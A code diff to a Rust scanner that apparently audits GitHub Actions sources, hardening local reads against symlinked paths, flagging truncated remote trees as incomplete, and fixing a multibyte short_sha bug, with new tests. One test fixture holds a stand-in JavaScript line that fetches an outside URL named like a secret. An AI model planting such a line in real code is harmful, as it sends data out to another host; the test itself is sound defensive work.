@@ -8,6 +8,7 @@
 
 use anyhow::{Context, Result};
 use serde_norway::Value;
+use std::io::Read;
 use std::path::{Component, Path, PathBuf};
 use std::sync::Arc;
 use tokio::sync::Semaphore;
@@ -146,6 +147,7 @@ fn force_include_remote_action_entrypoints(
 }
 
 fn force_include_local_action_entrypoints(
+    repo_root: &Path,
     action_dir: &Path,
     targets: &mut Vec<(PathBuf, SourceFileKind)>,
 ) {
@@ -155,7 +157,7 @@ fn force_include_local_action_entrypoints(
         .collect();
 
     for path in metadata_paths {
-        let Ok(content) = std::fs::read_to_string(&path) else {
+        let Ok(Some(content)) = read_local_source_file(repo_root, &path) else {
             continue;
         };
         let Ok(yaml) = serde_norway::from_str::<Value>(&content) else {
@@ -163,7 +165,13 @@ fn force_include_local_action_entrypoints(
         };
         for entrypoint in action_yml_entrypoint_paths(&yaml, "") {
             let path = action_dir.join(&entrypoint);
-            if local_entrypoint_is_regular_file(&path) {
+            let Some(relative) = path.strip_prefix(repo_root).ok() else {
+                continue;
+            };
+            if matches!(
+                workflow::open_child_file_path(repo_root, relative),
+                Ok(Some(_))
+            ) {
                 push_unique_local_source_target(targets, path, SourceFileKind::JavaScript);
             }
         }
@@ -232,10 +240,17 @@ fn push_unique_local_source_target(
     }
 }
 
-fn local_entrypoint_is_regular_file(path: &Path) -> bool {
-    std::fs::symlink_metadata(path)
-        .map(|metadata| metadata.file_type().is_file())
-        .unwrap_or_default()
+fn read_local_source_file(repo_root: &Path, path: &Path) -> Result<Option<String>> {
+    let relative = path
+        .strip_prefix(repo_root)
+        .with_context(|| format!("{} is outside the repository", path.display()))?;
+    let Some(mut file) = workflow::open_child_file_path(repo_root, relative)? else {
+        return Ok(None);
+    };
+    let mut content = String::new();
+    file.read_to_string(&mut content)
+        .with_context(|| format!("reading {}", path.display()))?;
+    Ok(Some(content))
 }
 
 async fn fetch_remote_source_files(
@@ -369,16 +384,16 @@ pub(crate) fn scan_local_action_source(
 ) -> Result<ActionScanStatus> {
     let action_dir = local_action_dir(repo_root, action)?;
     let mut targets = collect_local_source_files(&action_dir)?;
-    force_include_local_action_entrypoints(&action_dir, &mut targets);
+    force_include_local_action_entrypoints(repo_root, &action_dir, &mut targets);
     if targets.is_empty() {
         return Ok(ActionScanStatus::Complete);
     }
 
     let mut complete = true;
     for (path, kind) in targets {
-        let content = match std::fs::read_to_string(&path) {
-            Ok(content) => content,
-            Err(_) => {
+        let content = match read_local_source_file(repo_root, &path) {
+            Ok(Some(content)) => content,
+            Ok(None) | Err(_) => {
                 complete = false;
                 continue;
             }
@@ -425,15 +440,16 @@ pub(crate) async fn scan_action_source(
         .await?;
 
     let base = action.subpath.as_deref().unwrap_or("");
-    let mut targets = select_source_files(&tree, base);
+    let mut targets = select_source_files(&tree.entries, base);
     if targets.is_empty() {
-        return Ok(ActionScanStatus::Complete);
+        return Ok(ActionScanStatus::from_complete(!tree.truncated));
     }
 
     // Fetch concurrently, then scan in tree order so findings are
     // deterministic regardless of which fetch lands first. A failed fetch
     // makes the scan incomplete, so the caller will not cache a clean verdict.
     let (mut contents, mut complete) = fetch_remote_source_files(client, action, &targets).await;
+    complete &= !tree.truncated;
     let initial_len = targets.len();
     force_include_remote_action_entrypoints(&mut targets, &contents);
     if targets.len() > initial_len {
@@ -504,7 +520,10 @@ fn scan_action_yml_runs(
 }
 
 pub(crate) fn short_sha(sha: &str) -> &str {
-    if sha.len() >= 7 { &sha[..7] } else { sha }
+    match sha.char_indices().nth(7) {
+        Some((end, _)) => &sha[..end],
+        None => sha,
+    }
 }
 
 #[cfg(test)]
@@ -600,6 +619,13 @@ runs:
     #[test]
     fn short_sha_short() {
         assert_eq!(short_sha("abc"), "abc");
+    }
+
+    #[test]
+    fn short_sha_handles_multibyte_refs() {
+        assert_eq!(short_sha("🦀🦀"), "🦀🦀");
+        assert_eq!(short_sha("aaaa🦀bb"), "aaaa🦀bb");
+        assert_eq!(short_sha("abcdef1234🦀"), "abcdef1");
     }
 
     #[test]
@@ -921,6 +947,122 @@ runs:
             err.to_string()
                 .contains("Refusing to scan symlinked directory")
         );
+        assert!(collector.findings.is_empty());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn scan_local_action_source_rejects_symlinked_entrypoint_component() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let outside = tempfile::TempDir::new().unwrap();
+        std::fs::write(
+            outside.path().join("leak.js"),
+            r#"fetch("https://example.com/OUT_OF_REPO_SECRET")"#,
+        )
+        .unwrap();
+
+        let action_dir = dir.path().join(".github/actions/local");
+        std::fs::create_dir_all(&action_dir).unwrap();
+        std::fs::write(
+            action_dir.join("action.yml"),
+            "name: local\nruns:\n  using: node20\n  main: sub/leak.js\n",
+        )
+        .unwrap();
+        std::os::unix::fs::symlink(outside.path(), action_dir.join("sub")).unwrap();
+
+        let action = LocalActionRef {
+            path: "./.github/actions/local".to_string(),
+            line_number: 1,
+        };
+        let mut collector = AuditCollector::new(false);
+        scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();
+
+        assert!(collector.findings.is_empty());
+    }
+
+    #[tokio::test]
+    async fn scan_action_source_reports_incomplete_when_tree_truncated() {
+        use serde_json::json;
+        use wiremock::matchers::{method, path};
+        use wiremock::{Mock, MockServer, ResponseTemplate};
+
+        let server = MockServer::start().await;
+        Mock::given(method("GET"))
+            .and(path(
+                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            ))
+            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
+                "tree": [{ "path": "action.yml", "type": "blob" }],
+                "truncated": true
+            })))
+            .mount(&server)
+            .await;
+        Mock::given(method("GET"))
+            .and(path("/repos/o/r/contents/action.yml"))
+            .respond_with(
+                ResponseTemplate::new(200)
+                    .set_body_string("runs:\n  using: composite\n  steps: []\n"),
+            )
+            .mount(&server)
+            .await;
+
+        let client = GitHubClient::with_base("t".into(), server.uri());
+        let action = ActionRef {
+            owner: "o".into(),
+            repo: "r".into(),
+            subpath: None,
+            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
+            ref_type: workflow::RefType::Sha,
+            tag_comment: Some("v1.0.0".into()),
+            line_number: 1,
+            raw_line: String::new(),
+        };
+        let mut collector = AuditCollector::new(false);
+
+        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
+            .await
+            .unwrap();
+
+        assert_eq!(status, ActionScanStatus::Incomplete);
+        assert!(collector.findings.is_empty());
+    }
+
+    #[tokio::test]
+    async fn scan_action_source_reports_incomplete_when_truncated_tree_has_no_targets() {
+        use serde_json::json;
+        use wiremock::matchers::{method, path};
+        use wiremock::{Mock, MockServer, ResponseTemplate};
+
+        let server = MockServer::start().await;
+        Mock::given(method("GET"))
+            .and(path(
+                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            ))
+            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
+                "tree": [{ "path": "README.md", "type": "blob" }],
+                "truncated": true
+            })))
+            .mount(&server)
+            .await;
+
+        let client = GitHubClient::with_base("t".into(), server.uri());
+        let action = ActionRef {
+            owner: "o".into(),
+            repo: "r".into(),
+            subpath: None,
+            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
+            ref_type: workflow::RefType::Sha,
+            tag_comment: Some("v1.0.0".into()),
+            line_number: 1,
+            raw_line: String::new(),
+        };
+        let mut collector = AuditCollector::new(false);
+
+        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
+            .await
+            .unwrap();
+
+        assert_eq!(status, ActionScanStatus::Incomplete);
         assert!(collector.findings.is_empty());
     }
 
